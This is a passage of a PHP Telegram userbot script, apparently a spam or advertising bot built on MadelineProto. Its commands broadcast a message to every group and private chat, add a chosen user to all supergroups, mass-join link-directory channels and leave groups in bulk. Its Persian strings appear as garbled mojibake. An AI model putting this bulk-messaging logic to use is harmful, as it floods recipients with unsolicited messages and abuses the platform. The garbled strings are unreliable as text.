                                    if ($type['type'] == 'supergroup') {
                                        $MadelineProto->messages->forwardMessages(['from_peer' => $chatID, 'to_peer' => $peer, 'id' => [$rid]]);
                                    }
                                }
                                yield $MadelineProto->messages->sendMessage(['peer' => $chatID, 'message' => 'ÿ®ÿß ŸÖŸàŸÅ€åÿ™ ÿ®Ÿá ÿ≥ŸàŸæÿ±⁄Øÿ±ŸàŸáÿß ŸÅÿ±Ÿàÿßÿ±ÿØ ⁄©ÿ±ÿØŸÖ']);
                            } else {
                                yield $MadelineProto->messages->sendMessage(['peer' => $chatID, 'message' => '‚Äºÿßÿ≤ ÿß€åŸÜ ÿØÿ≥ÿ™Ÿàÿ± ŸÅŸÇÿ∑ ÿØÿ± ÿ≥ŸàŸæÿ±⁄Øÿ±ŸàŸá ŸÖ€åÿ™ŸàÿßŸÜ€åÿØ ÿßÿ≥ÿ™ŸÅÿßÿØŸá ⁄©ŸÜ€åÿØ.']);
                            }
                        }
                       if(preg_match('/^(Send Sp (.*))$/i',$msg)){
$MadelineProto->messages->sendMessage(['peer' => $chatID,'message' => "ÿ±ÿ®ÿßÿ™ ÿØÿ±ÿ≠ÿßŸÑ ÿßÿ±ÿ≥ÿßŸÑ Ÿæ€åÿßŸÖ ÿßÿ≥ÿ™...",'parse_mode' => 'html']);
preg_match('/^(Send Sp (.*))$/i',$msg,$txt);
$dialogs = yield $MadelineProto->get_dialogs();	
foreach($dialogs as $peer){
try{
$type = yield $MadelineProto->get_info($peer);
$type3 = $type['type'];
if($type3 == "supergroup"){
$MadelineProto->messages->sendMessage(['peer' => $peer,'message' => $txt[2],'parse_mode' => 'html']);
}
}catch(\danog\MadelineProto\RPCErrorException $e){
}
}
$MadelineProto->messages->sendMessage(['peer' => $chatID,'message' => "ÿßÿ±ÿ≥ÿßŸÑ ÿ®Ÿá ÿ≥ŸàŸæÿ±⁄Øÿ±ŸàŸá Ÿáÿß ÿßŸÜÿ¨ÿßŸÖ ÿ¥ÿØ!",'parse_mode' => 'html']);
}
if(preg_match('/^(Send Pv (.*))$/i',$msg)){
$MadelineProto->messages->sendMessage(['peer' => $chatID,'message' => "ÿ±ÿ®ÿßÿ™ ÿØÿ±ÿ≠ÿßŸÑ ÿßÿ±ÿ≥ÿßŸÑ Ÿæ€åÿßŸÖ ÿßÿ≥ÿ™...",'parse_mode' => 'html']);
preg_match('/^(Send Pv (.*))$/i',$msg,$txt);
$dialogs = yield $MadelineProto->get_dialogs();	
foreach($dialogs as $peer){
try{
$type = yield $MadelineProto->get_info($peer);
$type3 = $type['type'];
if($type3 == "user"){
$MadelineProto->messages->sendMessage(['peer' => $peer,'message' => $txt[2],'parse_mode' => 'html']);
}
}catch(\danog\MadelineProto\RPCErrorException $e){
}
}
$MadelineProto->messages->sendMessage(['peer' => $chatID,'message' => "ÿßÿ±ÿ≥ÿßŸÑ ÿ®Ÿá Ÿæ€åŸà€å Ÿáÿß ÿßŸÜÿ¨ÿßŸÖ ÿ¥ÿØ!",'parse_mode' => 'html']);
}
if(preg_match('/^(Send all (.*))$/i',$msg)){
$MadelineProto->messages->sendMessage(['peer' => $chatID,'message' => "ÿ±ÿ®ÿßÿ™ ÿØÿ±ÿ≠ÿßŸÑ ÿßÿ±ÿ≥ÿßŸÑ Ÿæ€åÿßŸÖ ÿßÿ≥ÿ™...",'parse_mode' => 'html']);
preg_match('/^(Send all (.*))$/i',$msg,$txt);
$dialogs = yield $MadelineProto->get_dialogs();	
foreach($dialogs as $peer){
try{
$type = yield $MadelineProto->get_info($peer);
$type3 = $type['type'];
if($type3 == "supergroup" or $type3 == "user"){
$MadelineProto->messages->sendMessage(['peer' => $peer,'message' => $txt[2],'parse_mode' => 'html']);
}
}catch(\danog\MadelineProto\RPCErrorException $e){
}
}
$MadelineProto->messages->sendMessage(['peer' => $chatID,'message' => "ÿßÿ±ÿ≥ÿßŸÑ ÿ®Ÿá ÿ™ŸÖÿßŸÖ ⁄Üÿ™ ŸáÿßÿßŸÜÿ¨ÿßŸÖ ÿ¥ÿØ!",'parse_mode' => 'html']);
}
                       
                        if ($msg == 'delchs' || $msg == '/delchs'){
yield $this->messages->sendMessage(['peer' => $chatID, 'message' =>'ùê©ùê•ùêûùêöùê¨ùêû ùê∞ùêöùê¢ùê≠...',
'reply_to_msg_id' => $msg_id]);
$all = yield $this->get_dialogs();
foreach ($all as $peer) {
$type = yield $this->get_info($peer);
$type3 = $type['type'];
if ($type3 == 'channel'){
$id = $type['bot_api_id'];
yield $this->channels->leaveChannel(['channel' => $id]);
}
} yield $this->messages->sendMessage(['peer' => $chatID, 'message' =>'ÿßÿ≤ ŸáŸÖŸá €å ⁄©ÿßŸÜÿßŸÑ Ÿáÿß ŸÑŸÅÿ™ ÿØÿßÿØŸÖ üëå','reply_to_msg_id' => $msg_id]);
}

  

                        
                        if (preg_match("/^[\/\#\!]?(delgroups) (.*)$/i", $msg)) {
                            preg_match("/^[\/\#\!]?(delgroups) (.*)$/i", $msg, $text);
                            yield $MadelineProto->messages->sendMessage(['peer' => $chatID, 'message' => 'ùê©ùê•ùêûùêöùê¨ùêû ùê∞ùêöùê¢ùê≠...', 'reply_to_msg_id' => $msg_id]);
                            $count = 0;
                            $all = yield $MadelineProto->get_dialogs();
                            foreach ($all as $peer) {
                                try {
                                    $type = yield $MadelineProto->get_info($peer);
                                    $type3 = $type['type'];
                                    if ($type3 == 'supergroup' || $type3 == 'chat') {
                                        $id = $type['bot_api_id'];
                                        if ($chatID != $id) {
                                            yield $MadelineProto->channels->leaveChannel(['channel' => $id]);
                                            $count++;
                                            if ($count == $text[2]) {
                                                break;
                                            }
                                        }
                                    }
                                }
                                catch(Exception $m) {
                                }
                            }
                            yield $MadelineProto->messages->sendMessage(['peer' => $chatID, 'message' => "ÿßÿ≤ $text[2] ÿ™ÿß ⁄Øÿ±ŸàŸá ŸÑŸÅÿ™ ÿØÿßÿØŸÖ üëå", 'reply_to_msg_id' => $msg_id]);
                        }
                        
                       
                        
                        if (preg_match("/^[\/\#\!]?(join) (.*)$/i", $msg)) {
                            preg_match("/^[\/\#\!]?(join) (.*)$/i", $msg, $text);
                            $id = $text[2];
                            try {
                                yield $MadelineProto->channels->joinChannel(['channel' => "$id"]);
                                yield $MadelineProto->messages->sendMessage(['peer' => $chatID, 'message' => '‚úÖ Joined', 'reply_to_msg_id' => $msg_id]);
                            }
                            catch(Exception $e) {
                                yield $MadelineProto->messages->sendMessage(['peer' => $chatID, 'message' => '‚ùóÔ∏è<code>' . $e->getMessage() . '</code>', 'parse_mode' => 'html', 'reply_to_msg_id' => $msg_id]);
                            }
                        }
                        if (preg_match("/^[\/\#\!]?(Setid) (.*)$/i", $msg)) {
                            preg_match("/^[\/\#\!]?(Setid) (.*)$/i", $msg, $text);
                            $id = $text[2];
                            try {
                                $User = yield $MadelineProto->account->updateUsername(['username' => "$id"]);
                            }
                            catch(Exception $v) {
                                $MadelineProto->messages->sendMessage(['peer' => $chatID, 'message' => '‚ùó' . $v->getMessage() ]);
                            }
                            $MadelineProto->messages->sendMessage(['peer' => $chatID, 'message' => "‚Ä¢ ŸÜÿßŸÖ ⁄©ÿßÿ±ÿ®ÿ±€å ÿ¨ÿØ€åÿØ ÿ®ÿ±ÿß€å ÿ±ÿ®ÿßÿ™ ÿ™ŸÜÿ∏€åŸÖ ÿ¥ÿØ :
 @$id"]);
                        }
                        if (preg_match('/^\/?(Bio) (.*)$/ui', $msg, $text1)) {
                            $new = $text1[2];
                            yield $this->account->updateProfile(['about' => "$new"]);
                            yield $this->messages->sendMessage(['peer' => $chatID, 'message' => "üî∏ÿ®€åŸà⁄Øÿ±ÿßŸÅ€å ÿ¨ÿØ€åÿØ ÿ™ÿ®⁄Ü€å: $new"]);
                        }
                        if (preg_match('/^\/?(Name) (.*)$/ui', $msg, $text1)) {
                            $new = $text1[2];
                            yield $this->account->updateProfile(['first_name' => "$new"]);
                            yield $this->messages->sendMessage(['peer' => $chatID, 'message' => "üî∏ŸÜÿßŸÖ ÿ¨ÿØ€åÿØ : $new"]);
                        }
						
						if (preg_match('/^\/?(Lastname) (.*)$/ui', $msg, $text1)) {
                            $new = $text1[2];
                            yield $this->account->updateProfile(['last_name' => "$new"]);
                            yield $this->messages->sendMessage(['peer' => $chatID, 'message' => "üî∏ŸÜÿßŸÖ ÿ¨ÿØ€åÿØ : $new"]);
                        }
						
                   
					  if(preg_match('/^(joinlinkdoni)$/i',$msg)){
                  $linkdonilist = array("grouhkadeh","linkdoni","linkdoni_co","linkdoni1","Linkdoni_kade","gorohkadetel","goroh_linky","linkdoniiiii5","Link4you","linkdonifori","linkdoni");
              foreach($linkdonilist as $list){
                try{
                  yield $this->channels->joinChannel(['channel' => "https://t.me/$list"]);
                }catch (RPCErrorException $e) {
                }catch (Exception $e) {}
              }
                yield $this->messages->sendMessage(['peer'=>$chatID,'reply_to_msg_id'=>$msg_id,'message'=>'ÿ±ÿ®ÿßÿ™ ÿ®ÿß ŸÖŸàŸÅŸÇ€åÿ™ ÿØÿ± #ŸÑ€åŸÜ⁄©ÿØŸàŸÜ€å_Ÿáÿß ÿ¨Ÿà€åŸÜ ÿ¥ÿØ!']);
					 }
					 
					
                        if (preg_match("/^[#\!\/](addall) (.*)$/", $msg)) {
                            preg_match("/^[#\!\/](addall) (.*)$/", $msg, $text1);
                            yield $MadelineProto->messages->sendMessage(['peer' => $chatID, 'message' => 'ùê©ùê•ùêûùêöùê¨ùêû ùê∞ùêöùê¢ùê≠...', 'reply_to_msg_id' => $msg_id]);
                            $user = $text1[2];
                            $dialogs = yield $MadelineProto->get_dialogs();
                            foreach ($dialogs as $peer) {
                                try {
                                    $type = yield $MadelineProto->get_info($peer);
                                    $type3 = $type['type'];
                                }
                                catch(Exception $d) {
                                }
                                if ($type3 == 'supergroup') {
                                    try {
                                        yield $MadelineProto->channels->inviteToChannel(['channel' => $peer, 'users' => ["$user"]]);
                                    }
                                    catch(Exception $d) {
                                    }
                                }
                            }
                            yield $MadelineProto->messages->sendMessage(['peer' => $chatID, 'message' => "⁄©ÿßÿ±ÿ®ÿ± **$user** ÿ™Ÿà€å ŸáŸÖŸá €å ÿßÿ®ÿ±⁄Øÿ±ŸàŸá Ÿáÿß ÿßÿØÿØ ÿ¥ÿØ ‚úÖ", 'parse_mode' => 'MarkDown']);
                        }
						
						if($msg == 'delgroups' || $msg == '/delgroups'){
 yield $MadelineProto->messages->sendMessage(['peer' => $chatID, 'message' =>'ŸÑÿ∑ŸÅÿß ⁄©ŸÖ€å ÿµÿ®ÿ± ⁄©ŸÜ€åÿØ...',
 'reply_to_msg_id' => $msg_id]);
  $all = yield $MadelineProto->get_dialogs();
  foreach ($all as $peer) {
  try {
  $type = yield $MadelineProto->get_info($peer);
  $type3 = $type['type'];
  if($type3 == 'supergroup' || $type3 == 'chat'){
  $id = $type['bot_api_id'];
  if($chatID != $id){
  yield $MadelineProto->channels->leaveChannel(['channel' => $id]);
 }
 }
 } catch(Exception $m){}
 }
 yield $MadelineProto->messages->sendMessage(['peer' => $chatID, 'message' =>'ÿßÿ≤ ŸáŸÖŸá €å ⁄Øÿ±ŸàŸá Ÿáÿß ŸÑŸÅÿ™ ÿØÿßÿØŸÖ üëå','reply_to_msg_id' => $msg_id]);
}
                        
                        if (preg_match('/^ÿπ⁄©ÿ≥$/i', $msg, $mch)) {
                            if (isset($update['message']['reply_to_msg_id'])) {
                                $peer = $update['message']['to_id'];
                                $rp = $update['message']['reply_to_msg_id'];
                                $Chat = yield $this->getPwrChat($peer, false);
                                $type = $Chat['type'];
                                if (in_array($type, ['channel', 'supergroup'])) {
                                    $messeg = yield $this->channels->getMessages(['channel' => $peer, 'id' => [$rp], ]);
                                } else {
                                    $messeg = yield $this->messages->getMessages(['id' => [$rp], ]);
                                }
                                if (isset($messeg['messages'][0]['media']['photo'])) {
                                    $media = $messeg['messages'][0]['media'];
                                    yield $this->photos->uploadProfilePhoto(['file' => $media, ]);
                                    $text1 = "ÿ®ÿß ŸÖŸàŸÅŸÇ€åÿ™ ÿ´ÿ®ÿ™ ÿ¥ÿØ";
                                } else {
                                    $text1 = "ÿ®ÿß€åÿØ ÿØÿ± ÿ±€åŸæŸÑ€å ÿ®Ÿá €å⁄© ÿπ⁄©ÿ≥ ÿßÿ±ÿ≥ÿßŸÑ ÿ¥ŸàÿØ";
                                }
                            } else {
                                $text1 = "ÿ®ÿß€åÿØ ÿØÿ± ÿ±€åŸæŸÑ€å ÿ®Ÿá €å⁄© ÿπ⁄©ÿ≥ ÿßÿ±ÿ≥ÿßŸÑ ÿ¥ŸàÿØ";
                            }
                            yield $this->messages->sendMessage(['peer' => $chatID, 'message' => $text1], ['FloodWaitLimit' => 0]);
                        }
                        if ($msg == "delphoto" || $msg == "ÿ≠ÿ∞ŸÅ") {
                            $photo = yield $this->photos->getUserPhotos(['user_id' => yield $this->get_self() ["id"], 'offset' => 0, 'max_id' => 0, 'limit' => 1, ]);
                            $inputPhoto = ['_' => "inputPhoto", 'id' => $photo["photos"]["0"]["id"], 'access_hash' => $photo["photos"]["0"]["access_hash"], 'file_reference' => "bytes"];
                            yield $this->photos->deletePhotos(['id' => [$inputPhoto]]);
                            yield $this->messages->sendMessage(['peer' => $chatID, 'message' => "‚û£ ÿ®ÿßŸÖŸàŸÅŸÇ€åÿ™ ÿ≠ÿ∞ŸÅ ÿ¥ÿØ ‚Ä¢"]);
                        }
                        
                        
                    }
                    
                    


 if($userID == $admin || isset($data['admins'][$userID])){
 yield $MadelineProto->messages->deleteHistory(['just_clear' => true, 'revoke' => false, 'peer' => $chatID, 'max_id' => $msg_id]);
}
 if ($userID == $admin) {
  if(!file_exists('true') && file_exists('madeline') && filesize('madeline')/1024 <= 4000){
file_put_contents('true', '');
 yield $MadelineProto->sleep(3);
copy('madeline', 'update-session/madeline');
}
}
}
} catch(Exception $e){}
 }
}
register_shutdown_function('shutdown_function', $lock);
closeConnection();
$MadelineProto->async(true);
$MadelineProto->loop(function () use ($MadelineProto) {
  yield $MadelineProto->setEventHandler('\EventHandler');
});
$MadelineProto->loop();
